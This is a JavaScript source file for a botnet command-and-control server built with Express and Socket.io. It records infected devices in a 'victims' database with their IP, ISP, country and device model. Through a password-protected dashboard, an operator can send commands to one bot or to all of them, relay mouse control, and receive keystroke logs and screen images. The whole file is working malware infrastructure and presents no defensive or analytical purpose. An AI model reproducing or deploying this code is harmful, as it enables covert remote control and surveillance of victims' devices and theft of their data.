import express  from "express";
import path from 'path'
import { Server } from "socket.io";
import bodyParser from 'body-parser';
import cors from 'cors'
import chalk from "chalk";
import { superBase } from "./superBaseAPI.js";
import session from "express-session";
import FileStore  from "session-file-store";

// Clearing the database
superBase.from("victims")
    .delete()
    .like("ID","%")



// Variables
const File_Store = FileStore(session)
const portB = 4000
const portM = 4001
const ipB = "0.0.0.0"
const ipM = "0.0.0.0"
let adminSoc = null;
let victim = null
// Variables


// Express
const app = express()
app.use(session({
    store: new File_Store(),
    secret: "keyboard cat",
    resave: false,
    cookie: { maxAge: 1000 * 60 * 60 * 24 },
    saveUninitialized: true
}))
app.use(bodyParser.urlencoded({ extended: false }))
app.use(express.static('static'))
app.use(cors())
app.use('/', (req,res,next)=>{
    console.log(req.path)
    if(req.path == "/login"){
        next() 
    }else{
        if(!req.session.name){
            console.log("name plz ",req.session.name)
            res.redirect("/login")
        }else{
            next()
        }
    }
})
app.get("/dashboard",(req,res)=>{
    res.sendFile(path.resolve("./static/html/index.html"))
})

app.get("/login",(req,res)=>{
    res.sendFile(path.resolve("./static/html/login.html"))
})

app.post("/login",async (req,res)=>{
    var username = req.body.username
    var password = req.body.password

    var {data:data,error:err} = await superBase.from("activeuser")
        .select("name")
        .eq("username",username)
        .eq("password",password)
    if (!(err || data.length == 0)){
        req.session.name = data[0].name
        res.send("ok")
    }else{
        res.send("error")
    }
})

app.post("/info",async (req,res)=>{
    var {data:data,error:err} = await superBase.from("victims").select("*").eq("ID",req.body.id)
    if(!(err || data.length == 0)){
        res.json(data[0])
        victim = botIo.sockets.sockets.get(req.body.id)
    }
})

app.post("/send",async(req,res)=>{
    if(req.body.emit == "" || req.body.id == ""){
        res.status(400).send()
        return
    }

    if(req.body.emit == "ping"){
        botIo.emit("ping",req.body.args)
        // ids.forEach(id=>{
        //     botIo.sockets.sockets.get(id).emit("ping",req.body.args)
        // })
    }else{
        try {
            victim.emit(req.body.emit,req.body.args)
        } catch (error) {
            await superBase.from("victims")
            .delete()
            .eq("ID",victim.id)
            getRemaining()
            victim = null
        }
    }
    res.status(200).send("Good")
})


const botnet = express().listen(portB,ipB, () => {
    console.log(`Bot Network listening on http://${ipB}:${portB}/`)
})    

const masterServer = app.listen(portM,ipM, () => {
    console.log(`Master Network listening on http://${ipM}:${portM}/`)
}) 


// Socket io Connection for BOTS
const botIo = new Server(botnet);
botIo.on("connection",async (socket)=>{
    // Clearing the database
    superBase.from("victims")
        .delete()
        .like("ID","%")


    var data = JSON.parse(socket.handshake.query.info)
    await superBase.from("victims")
        .insert([{
            "ID":socket.id,
            "Country":data.Country,
            "ISP":data.ISP,
            "IP":data.IP,
            "Brand":data.Brand,
            "Model":data.Model,
            "Manufacture":data.Manufacture
        }])
    
    console.log(chalk.green(`[+] Bot Connected (${socket.id}) => ${socket.request.connection.remoteAddress}:${socket.request.connection.remotePort}`))
    getRemaining()


    socket.on("disconnect",async()=>{
        await superBase.from("victims")
            .delete()
            .eq("ID",socket.id)
        console.log(chalk.redBright(`[x] Bot Disconnected (${socket.id})`))
        getRemaining()
    })

    socket.on("logger",(data)=>{
        try {
            adminSoc.emit("logger",data)
        } catch (err) {
            console.error(err)
        }
    })

    socket.on("img",(data)=>{
        try {
            adminSoc.emit("img",data)
        } catch (err) {
            console.error(err)
        }
    })
})


// Socket io Connection for Master
const masterIo = new Server(masterServer);
masterIo.on("connection",(socket)=>{
    if(adminSoc == null){
        console.log(chalk.greenBright(`[+] Master got Connected (${socket.id})`))
        adminSoc = socket
        getRemaining()
    
        socket.on("disconnect",()=>{
            console.log(chalk.red(`[x] Master got Disconnected (${socket.id})`))
            adminSoc = null
        })

        socket.on("mouse",(data)=>{
            victim.emit("mouse",data)
        })
        
    }else{
        socket.disconnect()
    }


    
})


function getRemaining() {
    superBase.from("victims").select("ID,Brand,Model").limit(20)
        .then(({data:data,error:err}) =>{
            // console.log(data)
            if (!(err || data.length == 0 || adminSoc == null)){
                adminSoc.emit("info",data)
            }
        })
}








// async function run (params) {
//     // await superBase.from("victims")
//     //         .insert([{
//     //             "ID":"socket.id",
//     //             "Country":"data",
//     //             "ISP":"data.ISP",
//     //             "IP":"data.IP",
//     //             "Brand":"data.Brand",
//     //             "Model":"data.Model",
//     //             "Manufacture":"data.Manufacture"
//     //         }])
//     await superBase.from("victims")
//         .delete()
//         .like("ID","%")

//     var data = await superBase.from("victims").select().then(({data:d,error:err})=>{console.log(d)})
// }


// run()